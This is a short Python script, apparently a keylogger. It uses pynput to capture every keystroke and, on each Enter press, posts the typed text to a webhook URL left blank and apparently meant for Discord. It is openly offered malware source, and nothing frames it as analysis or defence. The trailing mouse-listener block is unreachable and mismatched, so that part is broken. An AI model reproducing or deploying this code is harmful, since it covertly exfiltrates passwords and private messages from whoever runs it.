import requests
from pynput import keyboard, mouse

cord_url = ""
string = ""
is_typing = False
caps = False

def on_press(key):
    global caps
    global is_typing
    global string

    try:
        char = key.char

        if char is None:
            char = key.vk # Numeric key

        if not is_typing:
            is_typing = True

        if caps: string += str(char).upper()
        else:    string += str(char)
        

    except AttributeError:
        if(key == keyboard.Key.caps_lock):
            caps = not caps
        if(key == keyboard.Key.backspace):
            string += "[BSP]"
        if(key == keyboard.Key.space):
            string += " "
        if(key == keyboard.Key.enter):
            send()

def send():
    global is_typing
    global string

    if is_typing:
        requests.post(cord_url, {"content": string})
        string = ""
        is_typing = False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

with mouse.Listener(on_click=send) as listener:
    listener.join()